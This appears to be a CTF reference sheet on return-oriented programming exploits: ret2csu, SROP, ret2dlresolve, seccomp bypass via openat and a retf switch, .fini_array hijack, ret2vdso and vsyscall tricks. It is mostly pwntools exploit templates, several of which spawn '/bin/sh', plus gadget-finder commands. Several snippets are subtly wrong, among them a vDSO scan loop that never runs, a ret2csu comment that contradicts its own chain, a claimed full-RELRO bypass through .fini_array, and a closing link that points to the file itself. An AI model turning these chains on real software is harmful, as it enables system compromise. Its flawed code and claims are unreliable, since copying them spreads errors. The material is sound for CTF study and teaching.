# CTF Pwn - ROP Techniques

## Table of Contents
- [ret2csu (Universal ROP Gadget)](#ret2csu-universal-rop-gadget)
- [Bad Character Bypass](#bad-character-bypass)
- [Exotic Gadgets](#exotic-gadgets)
  - [call []; pop; ret — Call Register via GOT](#call--pop-ret--call-register-via-got)
  - [SROP (Sigreturn Oriented Programming)](#srop-sigreturn-oriented-programming)
  - [ret2dlresolve (Dynamic Linker Abuse)](#ret2dlresolve-dynamic-linker-abuse)
- [Seccomp Bypass Alternatives](#seccomp-bypass-alternatives)
  - [openat / openat2 / sendfile](#openat--openat2--sendfile)
  - [RETF Architecture Switch](#retf-architecture-switch)
- [Stack Shellcode with Input Reversal](#stack-shellcode-with-input-reversal)
- [.fini_array Hijack](#fini_array-hijack)
- [ret2vdso — Using Kernel vDSO Gadgets](#ret2vdso--using-kernel-vdso-gadgets)
- [Vsyscall ROP for PIE Bypass](#vsyscall-rop-for-pie-bypass)
- [SROP with UTF-8 Payload Constraints](#srop-with-utf-8-payload-constraints)
- [Useful Commands](#useful-commands)

---

## ret2csu (Universal ROP Gadget)

Many x64 binaries contain `__libc_csu_init` which provides two gadgets controlling RDI, RSI, RDX, R8, R9, and the call instruction:

```python
# Gadget 1: pop rbx, rbp, r12, r13, r14, r15; ret
# Gadget 2: mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]

# Call arbitrary function with 3 arguments
POP_RBX = 0x4011a0
POP_RBP_R12_R13_R14_R15 = 0x4011a2
CALL_GADGET = 0x4011a8

rop = flat(
    POP_RBX, 0,                    # rbx=0 (used as index in call [r12+rbx*8])
    POP_RBP_R12_R13_R14_R15, 1, elf.got['puts'], 0, 0, binsh_addr,
    CALL_GADGET,                    # calls *(r12+rbx*8) = puts(got_entry)
    0, 0, 0, 0,                   # padding for call's ret
    # Now stack is aligned for next ROP call
    POP_RDI, binsh_addr,
    elf.plt['system'],
)
```

---

## Bad Character Bypass

**When:** Null bytes (`\x00`) break your ROP chain (e.g., using `strcpy`).

**Techniques:**

1. **Use alternative ROP gadgets** that don't contain bad bytes
```python
# Instead of 0x401000, try 0x401001 (skip one byte)
```

2. **Build address incrementally** via arithmetic gadgets
```python
POP_RDX = 0x4011d4
POP_RAX = 0x401000
ADD_RAX_RDX = 0x401111

# Build 0x4010d2 = 0x401000 + 0xd2
rop = flat(POP_RAX, 0x401000)
rop += flat(POP_RDX, 0xd2)
rop += flat(ADD_RAX_RDX)  # rax = 0x4010d2
```

3. **Avoid null bytes in pop values**
```python
# Instead of p64(0x0000deadbeef), encode differently
# or use multiple pops to build the value
```

---

## Exotic Gadgets

### call []; pop; ret — Call Register via GOT

When standard ROP gadgets aren't enough, `call [r64]` gadget calls the function pointer stored at a GOT entry, allowing indirect calls with full register control:

```python
# Find: call qword ptr [r15]; pop <registers>; ret
# r15 must point to a GOT entry you control

rop = flat(
    POP_R15, elf.got['setcontext'],  # r15 = pointer to setcontext
    CALL_R15,                         # calls setcontext(got_entry)
    # setcontext takes an opaque struct — not useful directly
    # Instead: use it to set rsp = rdi, rip = rsi
)
```

### SROP (Sigreturn Oriented Programming)

**When to use:** Very few gadgets available. Need to set many registers at once.

```python
# SigreturnFrame sets ALL registers atomically
frame = SigreturnFrame()
frame.rax = 59          # execve
frame.rdi = binsh_addr  # "/bin/sh"
frame.rsi = 0          # argv = NULL
frame.rdx = 0          # envp = NULL
frame.rip = syscall_addr
frame.rsp = rop_chain_addr

# Need only: set rax=15, syscall
payload = p64(pop_rax_ret)
payload += p64(15)      # rt_sigreturn
payload += p64(syscall_ret)
payload += bytes(frame)
```

### ret2dlresolve (Dynamic Linker Abuse)

**When to use:** No libc leak, but `write` or `printf` in PLT.

```python
# Perform linker's lazy resolution at runtime
# Overwrite DT_STRTAB, DT_SYMTAB, DT_JMPREL to control resolution

# 1. Leak link_map address from GOT
# 2. Compute addresses relative to link_map
# 3. Overwrite reloc entries to resolve to system()
# 4. Call plt entry — resolves to system("/bin/sh")
```

---

## Seccomp Bypass Alternatives

### openat / openat2 / sendfile

```python
# When seccomp blocks open/read/write
# Alternative syscalls that may not be blocked:
#   openat()  = 257,  openat2() = 437,  sendfile() = 40
#   readv()   = 19,   writev()  = 20

rop = ROP(libc)
rop.raw(pop_rdi)
rop.raw(-100)                      # AT_FDCWD
rop.raw(pop_rsi)
rop.raw(binsh_addr)                # "/flag"
rop.raw(pop_rdx)
rop.raw(0)                          # O_RDONLY
rop.call(libc.sym.openat)
```

### RETF Architecture Switch

**When to use:** Seccomp blocks execve/open/openat in x64. `retf` switches to 32-bit mode where syscall numbers differ.

```python
RETF = libc_base + 0x294bf

# ROP: mprotect BSS as RWX, then far return to 32-bit shellcode
rop  = flat(POP_RDI, BSS_ADDR)
rop += flat(POP_RSI_R15, 0x1000, 0)
rop += flat(POP_RDX_RBX, 7, 0)
rop += flat(libc_base + libc.sym.mprotect)
rop += flat(RETF)
rop += p32(BSS_SHELLCODE)   # 32-bit EIP
rop += p32(0x23)             # CS = IA-32e compat mode

# 32-bit shellcode uses int 0x80: open=5, read=3, write=4, exit=1
```

---

## Stack Shellcode with Input Reversal

**Pattern:** Binary reverses input before returning.

```python
# 1. Leak address via info-leak
# 2. Pre-reverse shellcode + partial 6-byte RIP overwrite
# 3. Use short jumps + NOP sleds (no multi-address ROP)
shellcode_rev = shellcode[::-1]
```

---

## .fini_array Hijack

**When to use:** Writable `.fini_array` + arbitrary write. Full RELRO bypass.

```python
# Overwrite .fini_array[0] to point to shellcode or ROP chain
# When main() returns, __libc_csu_fini calls it
writes = {
    fini_array: target & 0xFFFF,
    fini_array + 2: (target >> 16) & 0xFFFF,
}
```

---

## ret2vdso — Using Kernel vDSO Gadgets

**Pattern:** Statically-linked binary with no useful ROP gadgets. vDSO (Virtual Dynamic Shared Object) is mapped in every process.

```python
# vDSO gadgets (kernel-specific — always dump remote vDSO)
POP_RDX_RAX_RET = vdso_base + 0xba0
POP_RBX_R12_RBP_RET = vdso_base + 0x8c6
MOV_RDI_RBX_SYSCALL = vdso_base + 0x8e3

# Find vDSO base via AT_SYSINFO_EHDR (auxv type 0x21)
stackdump = leak_stack()
for i in range(len(stackdump) - 15, 8):
    val = u64(stackdump[i:i+8])
    if val == 0x21:
        vdso_base = u64(stackdump[i+8:i+16])
        break
```

---

## Vsyscall ROP for PIE Bypass

On older kernels, vsyscall page is at fixed address `0xffffffffff600000` regardless of ASLR:

```python
# vsyscall entries all end with ret:
# 0xffffffffff600000 = gettimeofday (ret at +0x9)
# 0xffffffffff600400 = time (ret at +0x9)
# 0xffffffffff600800 = getcpu (ret at +0x9)

payload = b'A' * 72
payload += p64(0xffffffffff600400)  # vsyscall time: NOP-ret
payload += p64(0xffffffffff600400)
payload += b"\x8b\x10"              # partial overwrite to target (2 bytes)
```

---

## SROP with UTF-8 Payload Constraints

**Pattern:** Input validated as UTF-8 (Rust `from_utf8_lossy`). All gadget addresses must be valid UTF-8 bytes.

**Key technique:** Multi-byte UTF-8 sequences (2-4 bytes) can span adjacent fields in signal frames. Set the leader byte (0xC0-0xF7) as the last byte of one field so continuation bytes (0x80-0xBF) in the next field form a valid sequence.

```python
# r15 last byte = 0xE0 (3-byte UTF-8 leader)
# E0 B0 9F = valid UTF-8 spanning r15→rdi boundary
frame.r15 = 0xE000000000000000
```

---

## Useful Commands

```bash
one_gadget libc.so.6           # Find one-shot gadgets
ropper -f binary               # Find ROP gadgets
ROPgadget --binary binary      # Alternative gadget finder
seccomp-tools dump ./binary    # Check seccomp rules
```

---

For blind pwn, GOT overwrite, and FSOP, see [format-string.md](format-string.md).

For advanced techniques (SROP+UTF8, double pivot, ret2vdso), see [rop-techniques.md](rop-techniques.md) (this file covers advanced ROP).
